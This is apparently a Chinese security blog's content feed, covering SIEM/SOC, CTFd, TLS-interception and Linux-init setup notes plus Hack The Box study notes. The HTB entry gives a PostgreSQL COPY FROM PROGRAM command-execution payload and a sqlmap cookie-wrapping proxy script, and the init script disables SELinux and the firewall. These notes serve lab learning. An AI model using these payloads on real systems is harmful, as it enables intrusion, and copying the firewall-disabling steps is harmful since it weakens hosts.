comment">#停止es</span>systemctl stop kibana.service<span class="token comment">#查看es状态</span>systemctl status kibana.service</code></pre><p>访问测试：</p><p><img src="/assets/image-20231011173350036.png" alt="image-20231011173350036"></p><p>至此，已经完成ES和Kibana的安装,我们的数据存储和浏览的核心组件。</p><p>后续将会讲解如何引入其他组件，如数据采集、数据处理、规则判断、告警生命周期。</p><h1 id="0x04-wazuh安装"><a href="#0x04-wazuh安装" class="headerlink" title="0x04 wazuh安装"></a>0x04 wazuh安装</h1><p>Wazuh 架构图：</p><p>本文主要使用 wazuh 做日志收集、规则判断</p><p><img src="/assets/image-20231011182108967.png" alt="image-20231011182108967"></p><p>访问 <a href="https://documentation.wazuh.com/current/installation-guide/wazuh-server/step-by-step.html">https://documentation.wazuh.com/current/installation-guide/wazuh-server/step-by-step.html</a></p><p>根据文档执行安装命令如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> gnupg apt-transport-https<span class="token function">curl</span> -s https://packages.wazuh.com/key/GPG-KEY-WAZUH <span class="token operator">|</span> gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">644</span> /usr/share/keyrings/wazuh.gpg<span class="token builtin class-name">echo</span> <span class="token string">"deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main"</span> <span class="token operator">|</span> <span class="token function">tee</span> -a /etc/apt/sources.list.d/wazuh.list<span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> wazuh-manager<span class="token comment">#设置开机自启动并启动wazuh manager</span>systemctl daemon-reloadsystemctl <span class="token builtin class-name">enable</span> wazuh-managersystemctl start wazuh-manager<span class="token comment">#查看wazuh 状态</span>systemctl status wazuh-manager</code></pre><p>Wazuh 启动后，需要将Wazuh的日志，发送到ES，此处使用 FileBeat 进行转发</p><h4 id="FileBeat-安装与配置"><a href="#FileBeat-安装与配置" class="headerlink" title="FileBeat 安装与配置"></a>FileBeat 安装与配置</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> -y <span class="token function">install</span> filebeat<span class="token comment">#下载wazuh编辑好的filebeat yml文件</span><span class="token function">curl</span> -so /etc/filebeat/filebeat.yml https://packages.wazuh.com/4.5/tpl/wazuh/filebeat/filebeat.yml<span class="token comment">#编辑配置文件</span><span class="token function">vim</span> /etc/filebeat/filebeat.yml</code></pre><p>配置文件如下</p><pre class="language-YAML" data-language="YAML"><code class="language-YAML"># Wazuh - Filebeat configuration fileoutput.elasticsearch:  hosts: ["127.0.0.1:9200"]  protocol: http#  username: ${username}#  password: ${password}#  ssl.certificate_authorities:#    - /etc/filebeat/certs/root-ca.pem#  ssl.certificate: "/etc/filebeat/certs/filebeat.pem"#  ssl.key: "/etc/filebeat/certs/filebeat-key.pem"setup.template.json.enabled: truesetup.template.json.path: '/etc/filebeat/wazuh-template.json'setup.template.json.name: 'wazuh'setup.ilm.overwrite: truesetup.ilm.enabled: falsefilebeat.modules:  - module: wazuh    alerts:      enabled: true    archives:      enabled: falselogging.level: infologging.to_files: truelogging.files:  path: /var/log/filebeat  name: filebeat  keepfiles: 7  permissions: 0644logging.metrics.enabled: falseseccomp:  default_action: allow  syscalls:  - action: allow    names:    - rseq</code></pre><p>下载 wazuh alerts索引template</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/4.5/extensions/elasticsearch/7.x/wazuh-template.json<span class="token function">chmod</span> go+r /etc/filebeat/wazuh-template.json<span class="token comment">#下载 wazuh module</span><span class="token function">curl</span> -s https://packages.wazuh.com/4.x/filebeat/wazuh-filebeat-0.2.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -xvz -C /usr/share/filebeat/module<span class="token comment">#启动filebeat</span>systemctl daemon-reloadsystemctl <span class="token builtin class-name">enable</span> filebeatsystemctl start filebeat</code></pre><p>卡住了，filebeat无法正确将日志发送到es，经过查询官方文档 <a href="https://documentation.wazuh.com/current/integrations-guide/index.html">https://documentation.wazuh.com/current/integrations-guide/index.html</a> 得知， filebeat集成的方式仅支持 到Wazuh 4.5.3 and Elastic Stack 7.17.13</p><p>如果 ES超过该版本，则需要 使用 Logstash 进行集成，并且Kibana不再支持 wazuh的APP。</p><p>因此此处可选择重新安装 ES+Kibana 或者使用 logstash进行集成。</p><h1 id="0x05-Wazuh-decoder"><a href="#0x05-Wazuh-decoder" class="headerlink" title="0x05 Wazuh-decoder"></a>0x05 Wazuh-decoder</h1><h4 id="1-Agent上报"><a href="#1-Agent上报" class="headerlink" title="1. Agent上报"></a>1. Agent上报</h4><h4 id="2-Syslog上报"><a href="#2-Syslog上报" class="headerlink" title="2.Syslog上报"></a>2.Syslog上报</h4><h4 id="3-Windows事件日志"><a href="#3-Windows事件日志" class="headerlink" title="3. Windows事件日志"></a>3. Windows事件日志</h4><h4 id="4-Docker日志"><a href="#4-Docker日志" class="headerlink" title="4.Docker日志"></a>4.Docker日志</h4><h1 id="0x06-Wazuh-rule"><a href="#0x06-Wazuh-rule" class="headerlink" title="0x06 Wazuh-rule"></a>0x06 Wazuh-rule</h1><h1 id="0x07-Jira安装"><a href="#0x07-Jira安装" class="headerlink" title="0x07 Jira安装"></a>0x07 Jira安装</h1>]]></content>
      
      
      
        <tags>
            
            <tag> elk </tag>
            
            <tag> soc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGPT_Next_Web</title>
      <link href="/2023/10/11/chatgpt-next-web/"/>
      <url>/2023/10/11/chatgpt-next-web/</url>
      
        <content type="html"><![CDATA[<h2 id="00-项目地址"><a href="#00-项目地址" class="headerlink" title="00 项目地址"></a>00 项目地址</h2><p><a href="https://github.com/Yidadaa/ChatGPT-Next-Web">https://github.com/Yidadaa/ChatGPT-Next-Web</a></p><h2 id="01-ChatGPT-Next-web-搭建"><a href="#01-ChatGPT-Next-web-搭建" class="headerlink" title="01 ChatGPT-Next-web 搭建"></a>01 ChatGPT-Next-web 搭建</h2><p>使用docker搭建命令如下：</p><p>例如在这此处买账号带key <a href="https://www.51chatgpt.info/">https://www.51chatgpt.info/</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -d -p <span class="token number">80</span>:3000 -e <span class="token assign-left variable">OPENAI_API_KEY</span><span class="token operator">=</span>sk-6xxxxxx -e <span class="token assign-left variable">CODE</span><span class="token operator">=</span>password  yidadaa/chatgpt-next-web</code></pre><p>如果不能 F/Q 可使用以下两种方式:</p><p>第三方 API 服务</p><p>例如 <a href="https://openkey.cloud/">https://openkey.cloud/</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -d -p <span class="token number">80</span>:3000 -e <span class="token assign-left variable">OPENAI_API_KEY</span><span class="token operator">=</span>sk-txxxxxx -e <span class="token assign-left variable">CODE</span><span class="token operator">=</span>password -e <span class="token assign-left variable">BASE_URL</span><span class="token operator">=</span>https://openkey.cloud yidadaa/chatgpt-next-web</code></pre><p>配置代理的方式</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -d -p <span class="token number">80</span>:3000 -e <span class="token assign-left variable">OPENAI_API_KEY</span><span class="token operator">=</span>sk-6xxxxxx -e <span class="token assign-left variable">CODE</span><span class="token operator">=</span>password -e <span class="token assign-left variable">PROXY_URL</span><span class="token operator">=</span>http://localhost:7890 yidadaa/chatgpt-next-web</code></pre><h2 id="03-测试使用"><a href="#03-测试使用" class="headerlink" title="03 测试使用"></a>03 测试使用</h2><p>搭建完成效果如图</p><p><img src="/assets/image-20231011161446196.png" alt="image-20231011161446196"></p>]]></content>
      
      
      
        <tags>
            
            <tag> chatgpt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF平台搭建</title>
      <link href="/2022/11/27/ctf-ping-tai-da-jian/"/>
      <url>/2022/11/27/ctf-ping-tai-da-jian/</url>
      
        <content type="html"><![CDATA[<p>平台:ununtu 20.4</p><p>组件：</p><ul><li>docker docker-compose</li><li>ctfd <a href="https://github.com/CTFd/CTFd">https://github.com/CTFd/CTFd</a></li><li>ctf-whale <a href="https://github.com/glzjin/CTFd-Whale">https://github.com/glzjin/CTFd-Whale</a></li><li>open vpn : kylemanna/openvpn</li></ul><h2 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h2><p>略过，网上教程较多 将docker-compose 也顺便装上</p><pre class="language-none"><code class="language-none">docker swarm initdocker node update --label-add "name=linux-1" $(docker node ls -q)</code></pre><h2 id="open-vpn"><a href="#open-vpn" class="headerlink" title="open vpn"></a>open vpn</h2><p>参考 <a href="http://www.kyo86.com/2022/10/08/openvpn/">http://www.kyo86.com/2022/10/08/openvpn/</a></p><p>open vpn 通过 docker安装</p><pre class="language-none"><code class="language-none">#创建newwork，后面靶机也放在这个network中，用户连接ovpn后可直接访问靶机docker network create --driver bridge --subnet 172.18.0.0/24 --gateway 172.18.0.1 ovpn_networkdocker pull kylemanna/openvpnOVPN_DATA="ovpn-data-example"#初始化数据docker volume create --name $OVPN_DATAdocker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_genconfig -u udp://[ipordomain]docker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn ovpn_initpki</code></pre><p>修改 server 配置文件</p><p><code>/var/lib/docker/volumes/ovpn-data-example/_data/openvpn.conf</code></p><pre class="language-none"><code class="language-none">server 192.168.255.0 255.255.255.0verb 3key /etc/openvpn/pki/private/[修改为自己的ip].keyca /etc/openvpn/pki/ca.crtcert /etc/openvpn/pki/issued/[修改为自己的ip].crtdh /etc/openvpn/pki/dh.pemtls-auth /etc/openvpn/pki/ta.keykey-direction 0keepalive 10 60persist-keypersist-tunproto tcp# Rely on Docker to do port mapping, internally always 1194port 443dev tun0status /tmp/openvpn-status.loguser nobodygroup nogroupcomp-lzo### Route Configurations Belowroute 192.168.254.0 255.255.255.0### Push Configurations Below# push "block-outside-dns"# push "dhcp-option DNS 8.8.8.8"# push "dhcp-option DNS 8.8.4.4"# push "comp-lzo no"push "route 172.18.0.0 255.255.255.0"</code></pre><p><code>/var/lib/docker/volumes/ovpn-data-example/_data/ovpn_env.sh</code> 中的 declare -x OVPN_DISABLE_PUSH_BLOCK_DNS=0 改为 1</p><p>继续操作启动  ovpn</p><pre class="language-none"><code class="language-none">docker run --name=openvpn -v $OVPN_DATA:/etc/openvpn -d -p 443:443/tcp --cap-add=NET_ADMIN --net ovpn_network kylemanna/openvpn#创建用户 .ovpndocker run -v $OVPN_DATA:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full asp nopassdocker run -v $OVPN_DATA:/etc/openvpn --rm kylemanna/openvpn ovpn_getclient asp &gt; asp.ovpn#检查 asp.ovpn  确保 端口 协议 正确  443 tcp注释asp.ovpn 中的 redirect-gateway def1添加 comp-lzo</code></pre><p>如需开启单个证书同时登陆，可在服务端添加 duplicate-cn</p><p>证书注销：</p><pre class="language-none"><code class="language-none">#查看路径docker volume inspect ovpn-data-example#删除用户证书rm ***/_data/pki/private/CLIENTNAME.key#删除请求rm ***/_data/pki/reqs/CLIENTNAME.req#删除client 所在行vim ***/_data/pki/index.txt</code></pre><h2 id="ctfd-amp-ctf-whale-安装"><a href="#ctfd-amp-ctf-whale-安装" class="headerlink" title="ctfd &amp; ctf-whale 安装"></a>ctfd &amp; ctf-whale 安装</h2><p>修改ctf-whale 代码，集成在 ctfd中</p><p>修改 docker-compose 和 Dockfile </p><p>修改为 靶机以容器启动，返回容器IP到前端，不直接暴露到公网</p><p>用户使用openvpn连接后进行访问</p><p>ctfd 版本： 3.5.0</p><pre class="language-none"><code class="language-none">git clone https://github.com/AspirePig/ctfd_with_dockercd ctfd_with_docker</code></pre><p>编译启动</p><pre class="language-none"><code class="language-none">docker-compose builddocker-compose up -d </code></pre><p>不出意外可以访问 <a href="http://ip:8000/">http://ip:8000</a> 进行初始化配置</p><p><img src="/assets/image-20221127144518490.png" alt="image-20221127144518490"></p><p>测试</p><p><img src="/assets/image-20221127215258486.png" alt="image-20221127215258486"></p><h2 id="制作靶机"><a href="#制作靶机" class="headerlink" title="制作靶机"></a>制作靶机</h2><pre class="language-none"><code class="language-none">#导出镜像docker export -o  pwcupload test2#导入镜像docker import -c 'CMD ["bash","/run.sh"]' pwcupload pwcupload:latest#启动容器docker run --name test1  -d  --net mynet pwcupload:latest #可以在/run.sh 中 将环境变量中的flag 写入文件</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfd </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arkime+TLS流量解密</title>
      <link href="/2022/08/01/arkime-tls-liu-liang-jie-mi/"/>
      <url>/2022/08/01/arkime-tls-liu-liang-jie-mi/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>下载 PolarProxy</p><h2 id="修改-Arkime-配置"><a href="#修改-Arkime-配置" class="headerlink" title="修改 Arkime 配置"></a>修改 Arkime 配置</h2><p>编辑/opt/arkime/etc/config.ini，添加”pcapReadMethod = pcap-over-ip-server”，将Arkime配置为监听PCAP连接。</p><p>启动 arkime</p><pre class="language-none"><code class="language-none">sudo systemctl start arkimecapture.service</code></pre><p>查看是否监听</p><pre class="language-none"><code class="language-none">ss -antp | grep 57012</code></pre><h2 id="安装-PolarProxy"><a href="#安装-PolarProxy" class="headerlink" title="安装 PolarProxy"></a>安装 PolarProxy</h2><p> <a href="https://www.netresec.com/?page=PolarProxy">https://www.netresec.com/?page=PolarProxy</a></p><p>创建用户</p><pre class="language-none"><code class="language-none">sudo adduser --system --shell bin/bash proxyusersudo mkdir /var/log/PolarProxysudo chown proxyuser:root /var/log/PolarProxy/sudo chmod 0775 /var/log/PolarProxy/sudo su - proxyusermkdir ~/PolarProxycd ~/PolarProxy/curl https://www.netresec.com/?download=PolarProxy | tar -xzf -exit</code></pre><p>复制配置文件</p><pre class="language-none"><code class="language-none">sudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.service</code></pre><p>修改配置文件</p><p>修改/etc/systemd/system/PolarProxy.service，在ExecStart命令的末尾添加”–pcapoveripconnect 127.0.0.1:57012” 并修改监听端口及转发端口，实现 80 443 代理：</p><pre class="language-none"><code class="language-none">ExecStart=/home/proxyuser/PolarProxy/PolarProxy -v -p 443,443 -p 80,80 -x /var/log/PolarProxy/polarproxy.cer -f /var/log/PolarProxy/proxyflows.log -o /var/log/PolarProxy/ --certhttp 10080 --socks 1080 --httpconnect 8080 --pcapoveripconnect 127.0.0.1:57012 --allownontls</code></pre><p>启动服务</p><pre class="language-none"><code class="language-none">sudo systemctl enable PolarProxy.servicesudo systemctl start PolarProxy.service</code></pre><p>使用curl测试</p><pre class="language-none"><code class="language-none">curl --resolve www.baidu.com:443:192.168.65.129 https://www.baidu.com/ --header "Host: www.baidu.com"</code></pre><p><img src="/assets/image-20220801162119337.png" alt="image-20220801162119337"></p><p>在arkime中可以看见数据包明文即成功。</p><h2 id="信任证书"><a href="#信任证书" class="headerlink" title="信任证书"></a>信任证书</h2><p>centos 7 参考如下：</p><pre class="language-none"><code class="language-none">cp /var/log/PolarProxy/polarproxy.cer /etc/pki/ca-trust/source/anchorsln -s /etc/pki/ca-trust/source/anchors/polarproxy.cer /etc/ssl/certs/polarproxy.cerupdate-ca-trust</code></pre><p>win10 参考如下：</p><p><a href="https://mos86.com/40020.html%E3%80%81">https://mos86.com/40020.html、</a></p><h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>但是当前遇到的问题是需要让设备访问的所有域名走代理，当前只能代理 443 80</p><p>第一个问题：安装 内部dns服务器，将所有域名解析到该代理</p><pre class="language-none"><code class="language-none">address=/#/192.168.65.129</code></pre><p><img src="/assets/image-20220801171923612.png" alt="image-20220801171923612"></p><p>HTTP代理有两种方式：</p><p>一种是充当中间人</p><p>另一个总是建立隧道，之后只做转发，加密的https流量仍然是加密的</p>]]></content>
      
      
      
        <tags>
            
            <tag> Arkime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统初始化脚本</title>
      <link href="/2022/07/21/xi-tong-chu-shi-hua-jiao-ben/"/>
      <url>/2022/07/21/xi-tong-chu-shi-hua-jiao-ben/</url>
      
        <content type="html"><![CDATA[<h2 id="linux系统初始化"><a href="#linux系统初始化" class="headerlink" title="linux系统初始化"></a>linux系统初始化</h2><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ln</span> -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">crontab</span> -l <span class="token operator">|</span><span class="token function">grep</span> ntpdate <span class="token operator">&amp;&gt;</span>/dev/null <span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token punctuation">(</span>echo <span class="token string">"* 1 * * * ntpdate time.windows.com &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">;</span><span class="token function">crontab</span> -l<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token function">crontab</span><span class="token keyword">fi</span><span class="token function">sed</span> -i <span class="token string">'/SELINUX/{s/enforcing/disabled/}'</span>  /etc/selinux/config<span class="token keyword">if</span> <span class="token function">egrep</span> <span class="token string">"7.[0-9]"</span> /etc/redhat-release <span class="token operator">&amp;&gt;</span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>systemctl stop firewalldsystemctl disable firewalld<span class="token keyword">elif</span> <span class="token function">egrep</span> <span class="token string">"6.[0-9]"</span> /etc/redhat-release <span class="token operator">&amp;&gt;</span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token function">service</span> iptables stop<span class="token function">chkconfig</span> iptables off<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> HISTTIMEFORMAT /etc/bashrc<span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token builtin class-name">echo</span> <span class="token string">'export HISTTIMEFORMAT="%F %T `whoami` "'</span> <span class="token operator">&gt;&gt;</span> /etc/bashrc<span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> <span class="token string">"TMOUT=600"</span> /etc/profile <span class="token operator">&amp;&gt;</span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token builtin class-name">echo</span> <span class="token string">"export TMOUT=600"</span> <span class="token operator">&gt;&gt;</span> /etc/profile<span class="token keyword">fi</span><span class="token function">sed</span> -i <span class="token string">'s/^MAILTO=root/MAILTO=""/'</span>' /etc/crontab<span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> <span class="token string">"* soft nofile 65535"</span> /etc/security/limits.conf <span class="token operator">&amp;&gt;</span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span><span class="token function">cat</span> <span class="token operator">&gt;&gt;</span> /etc/security/limits.conf <span class="token operator">&lt;&lt;</span> <span class="token string">EOF* soft nofile 65535* hard nofile 65535EOF</span><span class="token keyword">fi</span><span class="token function">cat</span> <span class="token operator">&gt;&gt;</span> /etc/sysctl.conf <span class="token operator">&lt;&lt;</span> <span class="token string">EOFnet.ipv4.tcp_syncookies = 1net.ipv4.tcp_max_tw_buckets = 20480net.ipv4.tcp_max_syn_backlog = 20480net.core.netdev_max_backlog = 262144net.ipv4.tcp_fin_timeout = 20EOF</span>yum <span class="token function">install</span> gcc <span class="token function">make</span> autoconf <span class="token function">vim</span> sysstat net-tools iostat iftop iotp lrzsz -y</code></pre><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><pre class="language-none"><code class="language-none">#python2wget https://bootstrap.pypa.io/pip/2.7/get-pip.pypython2 get-pip.py#python3wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py</code></pre><h3 id="替换PIP源"><a href="#替换PIP源" class="headerlink" title="替换PIP源"></a>替换PIP源</h3><blockquote><p>~/.pip/pip.conf</p></blockquote><pre class="language-none"><code class="language-none">[global]index-url =http://mirrors.aliyun.com/pypi/simple/[install]trusted-host = mirrors.aliyun.com</code></pre><h2 id="替换YUM源"><a href="#替换YUM源" class="headerlink" title="替换YUM源"></a>替换YUM源</h2><pre class="language-none"><code class="language-none">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repowget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repoyum clean all yum makecache</code></pre><p>其他软件 参考<br><a href="https://aspirepig.github.io/2021/12/03/ruan-jian-tui-jian-ji-chang-yong-ming-ling/">https://aspirepig.github.io/2021/12/03/ruan-jian-tui-jian-ji-chang-yong-ming-ling/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB学习</title>
      <link href="/2022/07/18/htb-xue-xi/"/>
      <url>/2022/07/18/htb-xue-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="1-PostgreSQL-run-command"><a href="#1-PostgreSQL-run-command" class="headerlink" title="1.PostgreSQL  run command"></a>1.PostgreSQL  run command</h3><p>利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令</p><pre class="language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;-- Create a table to contain the result of my commandCREATE TABLE cmd_exec(cmd_output text); -- Execute the command and store the resultCOPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$'''; </code></pre><p>详细用法，参考：</p><ul><li><a href="https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767">https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767</a></li><li><a href="https://erichogue.ca/2022/07/HTBBusinessCTF/DebuggerUnchained">https://erichogue.ca/2022/07/HTBBusinessCTF/DebuggerUnchained</a></li></ul><h3 id="2-flask-debug模式-pin-rce"><a href="#2-flask-debug模式-pin-rce" class="headerlink" title="2.flask debug模式 pin rce"></a>2.flask debug模式 pin rce</h3><p>配合任意文件读取漏洞，获取到生成PIN码的关键参数，即可计算出PIN码</p><p>参考：<a href="https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p><h2 id="3-微软-MSDT-远程代码执行"><a href="#3-微软-MSDT-远程代码执行" class="headerlink" title="3.微软 MSDT 远程代码执行"></a>3.微软 MSDT 远程代码执行</h2><p> word 目录下的_rels 下的document.xml.rels插入恶意mhtml，不需要允许宏，即可利用MSDT 诊断 执行任意命令</p><p>工具使用：<a href="https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed">https://github.com/komomon/CVE-2022-30190-follina-Office-MSDT-Fixed</a></p><p>参考：<a href="https://blog.csdn.net/qq_17754023/article/details/125112334">https://blog.csdn.net/qq_17754023/article/details/125112334</a></p><h2 id="4-流量分析技巧"><a href="#4-流量分析技巧" class="headerlink" title="4.流量分析技巧"></a>4.流量分析技巧</h2><ul><li>wireshark export HTTP文件，follow TCP/HTTP stream</li><li>上传到 Arkime 进行分析</li></ul><p><img src="/assets/image-20220718194335947.png" alt="image-20220718194335947"></p><h3 id="5-sqlmap跑加密参数"><a href="#5-sqlmap跑加密参数" class="headerlink" title="5.sqlmap跑加密参数"></a>5.sqlmap跑加密参数</h3><p>例如 <code>{"id": 20, "output":"dGVzdGFh"}</code> 在提交时必须整个字符串进行base64 编码再提交，其中 id 存在sql注入。</p><p>可以写一个Python或者php脚本，对该请求进行封装</p><p>例如</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token keyword">import</span> requests<span class="token keyword">import</span> base64app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token string">'{"id": "'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'", "output": "a"}'</span>    <span class="token comment"># print(a)</span>    url <span class="token operator">=</span> <span class="token string">"http://142.93.37.65:30874/assets/jquery-3.6.0.slim.min.js"</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    cookie <span class="token operator">=</span> <span class="token string">'__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid='</span><span class="token operator">+</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token comment"># return text(cookie)</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337'</span><span class="token punctuation">,</span>        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'*/*'</span><span class="token punctuation">,</span>        <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>        <span class="token string">'Cookie'</span><span class="token punctuation">:</span> cookie    <span class="token punctuation">}</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    <span class="token keyword">return</span> text<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>此时测试时只需要使用sqlmap 扫描该python脚本提供的接口</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOC技术及搭建</title>
      <link href="/2022/04/24/soc-ji-zhu-ji-da-jian/"/>
      <url>/2022/04/24/soc-ji-zhu-ji-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>使用到的组件：</p><p>kibana—security模块</p><p>zeek：开源流量检测</p><p>suricata：开源流量检测</p><p>wazuh：开源HIDS</p><p>packetbeat：终端网络抓包</p><p>openEDR：收集Windows network、process、file 信息</p><p>winlogbeat：收集Windows日志信息</p><p>filebeat：传输日志</p><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="/assets/image-20220503105655223.png" alt="image-20220503105655223"></p>]]></content>
      
      
      
        <tags>
            
            <tag> JIRA </tag>
            
            <tag> ES </tag>
            
            <tag> filebeat </tag>
            
            <tag> HIDS </tag>
            
            <tag> NIDS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源NIDS系统搭建</title>
      <link href="/2022/04/20/kai-yuan-nids-xi-tong-da-jian/"/>
      <url>/2022/04/20/kai-yuan-nids-xi-tong-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>留坑待完善</p><h2 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h2><p><img src="/assets/image-20220425134901961.png" alt="image-20220425134901961"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ES </tag>
            
            <tag> filebeat </tag>
            
            <tag> zeek </tag>
            
            <tag> moloch </tag>
            
            <tag> arkime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LockBit Batch Download</title>
      <link href="/2022/02/26/lockbit-batch-download/"/>
      <url>/2022/02/26/lockbit-batch-download/</url>
      
